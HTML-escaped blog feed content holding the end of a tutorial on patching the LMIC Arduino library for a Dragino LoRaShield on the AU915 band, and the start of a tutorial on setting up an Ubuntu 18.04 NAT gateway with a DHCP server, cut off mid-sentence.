&lt;span class=&quot;token keyword&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; US915_FREQ_MIN &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;915000000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
       US915_FREQ_MAX &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;928000000&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The above code sets a new minimum (915000000) and maximum (928000000) frequency to match the AU915 band 2 standard.&lt;/p&gt;
&lt;p&gt;Now, we need to also make a small change in the &lt;code class=&quot;language-text&quot;&gt;lmic.c&lt;/code&gt; file. Change lines 776 to 779, from:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;LMIC_disableChannel&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;u1_t&lt;/span&gt; channel&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;    
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; channel &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;MAX_XCHANNELS &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;        
    LMIC&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;channelMap&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;channel&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;channel&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;to:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;LMIC_disableChannel&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;u1_t&lt;/span&gt; channel&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; channel &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;MAX_XCHANNELS &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;        
    LMIC&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;channelMap&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;channel&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;channel&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;All done! That was all the changes required to the LMIC Arduino port to get the Dragino LoRaShield working in the AU915 standard.&lt;/p&gt;
&lt;h3 id=&quot;arduino-sketch-for-dragino-lorashield&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#arduino-sketch-for-dragino-lorashield&quot; aria-label=&quot;arduino sketch for dragino lorashield permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Arduino sketch for Dragino LoRaShield&lt;/h3&gt;
&lt;p&gt;The script in this project was derived from the original Dragino LoRaShield sketch provided on the Dragino Wiki. The sketch required a variety of modifications. However, the most important modification is the selection of channels. The sketch initializes the LoRaWAN chip on the shield and enables all channels by default. The snippet of code below demonstrates how to use a simple for loop to disable specific channels (0-7 and 16-72). Ultimately, this only leaves the AU915 band 2 channels enabled, that is, channels 8-15. The code modification if documented below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// First, disable channels 0-7&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; channel&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; channel&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;channel&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;LMIC_disableChannel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;channel&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Now, disable channels 16-72&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; channel&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; channel&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;channel&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;token function&quot;&gt;LMIC_disableChannel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;channel&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// This means only channels 8-15 are up&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;additional-resources&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#additional-resources&quot; aria-label=&quot;additional resources permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Additional Resources&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://www.instructables.com/id/Use-Lora-Shield-and-RPi-to-Build-a-LoRaWAN-Gateway/&quot;&gt;http://www.instructables.com/id/Use-Lora-Shield-and-RPi-to-Build-a-LoRaWAN-Gateway/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://wiki.dragino.com/index.php?title=Lora_Shield&quot;&gt;http://wiki.dragino.com/index.php?title=Lora_Shield&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.thethingsnetwork.org/forum/t/ttn-australian-communities/4068/10&quot;&gt;https://www.thethingsnetwork.org/forum/t/ttn-australian-communities/4068/10&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.thethingsnetwork.org/forum/t/lmic-node-dropped-packets/4400/9&quot;&gt;https://www.thethingsnetwork.org/forum/t/lmic-node-dropped-packets/4400/9&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content:encoded></item><item><title><![CDATA[Building an Ubuntu Linux Gateway]]></title><description><![CDATA[This post documents how to build a Linux gateway using Ubuntu Server 18.04. The gateway connects an internal network to an external network…]]></description><link>https://thomaslaurenson.com/blog/2018-07-05/building-an-ubuntu-linux-gateway/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-07-05/building-an-ubuntu-linux-gateway/</guid><pubDate>Thu, 05 Jul 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This post documents how to build a Linux gateway using Ubuntu Server 18.04. The gateway connects an internal network to an external network - basically, performing Network Address Translation (NAT) for hosts on the internal network. It is exceptionally similar to what your ISP supplied home router does. To achieve this, an Ubuntu Linux server is configured as a DHCP server and also to provide NAT using &lt;code class=&quot;language-text&quot;&gt;iptables&lt;/code&gt;. &lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#configure-network-interface-cards&quot;&gt;Configure Network Interface Cards&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#install-dhcp-server&quot;&gt;Install DHCP server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#configure-network-address-translation&quot;&gt;Configure Network Address Translation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#configuring-internal-hosts-linux&quot;&gt;Configuring Internal Hosts: Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#configuring-internal-hosts-windows&quot;&gt;Configuring Internal Hosts: Windows&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#check-network-connectivity&quot;&gt;Check Network Connectivity&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;This tutorial is written when building a blueprint for VMWare vRealize, but the instructions lend to any virtualization, or normal, system. The &lt;em&gt;gateway&lt;/em&gt; connects to an external network named &lt;em&gt;vlan25&lt;/em&gt;Profile_ which provides Internet access, and a second network, &lt;em&gt;InternalNetwork&lt;/em&gt;, which is an isolated network. While &lt;em&gt;host1&lt;/em&gt; only connects to the &lt;em&gt;InternalNetwork&lt;/em&gt;. The vRealize blueprint for the network is displayed below.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/a47d7328ca7c9c358aecb5b88783d589/966a0/blueprint.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 49.36708860759494%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABN0lEQVQoz4WS626DMAyFef833P50SIWVQkO45A49s01BBY1Nwkry4ZzYJ8mm6YmzmJ8AfTJP07zj8wxh75wjOxNLaYbWGlV1h/ee1hNiTDK2rUbf95S3sBin/wU50TkHYwzNIwklhJA2vhzCB0RhfwtSTyFEiiBiPLLAwpb1yla+E0yHYOZ9hHfhsDmc8lVHBNngNda18w5F9YnL5Qt5nqMoChGz3uJ6+9h4WZbwrwpFMJD5hk50zsNaj0im881F8sfYAeX3DYouwRgn/5iPxJXSdDkd5Sx8a9mQ0bUeoNuWElox2splsPEJzUOh6wepjjdzMGfWD6Pw0VjqKIj3WUfVXRsF1TS417V4YmkTJ3MiV8HVjKPFMBgJ5kq1UjnPOddShyLo6Q2Nh5Z3EV/xG3+b87vlln8A/yUMfiJfdQMAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;vRealize blueprint&quot;
        title=&quot;vRealize blueprint&quot;
        src=&quot;/static/a47d7328ca7c9c358aecb5b88783d589/f058b/blueprint.png&quot;
        srcset=&quot;/static/a47d7328ca7c9c358aecb5b88783d589/c26ae/blueprint.png 158w,
/static/a47d7328ca7c9c358aecb5b88783d589/6bdcf/blueprint.png 315w,
/static/a47d7328ca7c9c358aecb5b88783d589/f058b/blueprint.png 630w,
/static/a47d7328ca7c9c358aecb5b88783d589/966a0/blueprint.png 944w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;configure-network-interface-cards&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#configure-network-interface-cards&quot; aria-label=&quot;configure network interface cards permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configure Network Interface Cards&lt;/h2&gt;
&lt;p&gt;The server only has one primary requirement: two Network Interface Cards (NICs). Start by listing the NICs that are available on the system:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;ls /sys/class/net/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If one, or no, NICs are present more need to be added in the hardware configuration for the virtual machine. In the case of a normal machine, one or two physical NICs are required. Another example of the network architecture is displayed below. This time, the NIC interface names have been supplied:&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/24282ebf373a6e616506a2f7342bf1f4/966a0/network_interfaces.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 49.36708860759494%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABWklEQVQoz4WSi07CMBSGef9nM2iCMaKRDFymbGXdrfeN33NaRwYJmuxkp3/b79y6Gscz7tl0BuiLfhinK32aELWlzra6BwthQtM0OB5LWGtpPcL7EP9SNui6js4lzfvxfyAfNMZAKUW+J1CAc+GipyAcwEftbyDV5JwncxHGfwYkLa1nbdavgOHGGGitg9H2cjFlxb4nn4F2AXWYORHIDZ4tRQJccDiedsiyDHmeUy+/E8xqfFUfOBw+sd9nKIoC9jfDCHTUfEURjbHQlBE3mKdYVgLrxwfsdhm2b+/YbJ5TZtSC1+0L1usnGloLpQ18WAxFUaOrpkcjJU1PxkYzvGk71LJFVZ0gxIkudxiUpiEZ2utRlgJdP8SsWTdcNmWyailqLmrUQlBWVeyJpqj9oCJYUhZsmnzW+l7FSlir6fkwjMG8H4GWShyWJfN7i2/uxsKN+Wuf3y2X/AONjAomgyHdUQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;vRealize blueprint with network interface names&quot;
        title=&quot;vRealize blueprint with network interface names&quot;
        src=&quot;/static/24282ebf373a6e616506a2f7342bf1f4/f058b/network_interfaces.png&quot;
        srcset=&quot;/static/24282ebf373a6e616506a2f7342bf1f4/c26ae/network_interfaces.png 158w,
/static/24282ebf373a6e616506a2f7342bf1f4/6bdcf/network_interfaces.png 315w,
/static/24282ebf373a6e616506a2f7342bf1f4/f058b/network_interfaces.png 630w,
/static/24282ebf373a6e616506a2f7342bf1f4/966a0/network_interfaces.png 944w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Now we know the names of the two NICs, we can edit the networking configuration file. Open the interfaces file using the &lt;code class=&quot;language-text&quot;&gt;vim&lt;/code&gt; editor, or another text editor of your choice (e.g., &lt;code class=&quot;language-text&quot;&gt;nano&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo vim /etc/network/interfaces&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In the following instructions, the two NICs that will be configured are &lt;code class=&quot;language-text&quot;&gt;ens160&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;ens192&lt;/code&gt;. The &lt;code class=&quot;language-text&quot;&gt;ens160&lt;/code&gt; NIC is connected to the outside world and will receive an IP address configuration from an external DHCP server. The &lt;code class=&quot;language-text&quot;&gt;ens192&lt;/code&gt; NIC is the internal interface that is connected to the same network that the internal hosts are on. Given the preceding network setup, the following configuration is specified:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;auto ens160
iface ens160 inet dhcp

auto ens192
iface ens192 inet static
    address 192.168.100.10
    netmask 255.255.255.0
    gateway 192.168.100.1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Restart networking on the system so that the new configuration is applied:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo systemctl restart networking&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;install-dhcp-server&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#install-dhcp-server&quot; aria-label=&quot;install dhcp server permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Install DHCP server&lt;/h2&gt;
&lt;p&gt;We are going to use Dynamic Host Configuration Protocol (DHCP) to supply IP addresses to any host on the internal network. Install the default package supplied by the Ubuntu repositories:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install isc-dhcp-server&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Edit the server configuration file:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo vim /etc/default/isc-dhcp-server&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The only change required here is to put the internal (&lt;code class=&quot;language-text&quot;&gt;ens192&lt;/code&gt;) interface in the file:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;INTERFACES=&quot;ens192&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, edit the DHCP configuration:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo vim /etc/dhcp/dhcpd.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Add the following configuration for the DHCP server. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;option domain-name-servers 8.8.8.8, 8.8.8.4;

option subnet-mask 255.255.255.0;
option broadcast-address 192.168.100.255;
subnet 192.168.100.0 netmask 255.255.255.0 {
range 192.168.100.20 192.168.100.100;
option routers 192.168.100.10;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A good resource for DHCP options is the &lt;a href=&quot;https://linux.die.net/man/5/dhcp-options&quot;&gt;dhcp-options man page from die.net&lt;/a&gt;. The first line of the configuration above specifies DNS settings. This allows translation of computer-friendly IP addresses to human-friendly domain names; for example: &lt;code class=&quot;language-text&quot;&gt;google.com&lt;/code&gt; corresponds to &lt;code class=&quot;language-text&quot;&gt;172.217.25.142&lt;/code&gt;. If you want, you can specify a &lt;code class=&quot;language-text&quot;&gt;domain-name&lt;/code&gt; option as well, but this is not required. However, make sure to include the &lt;code class=&quot;language-text&quot;&gt;domain-name-servers&lt;/code&gt; option with valid IP addresses from DNS servers. You can use the free Google DNS server using the value &lt;code 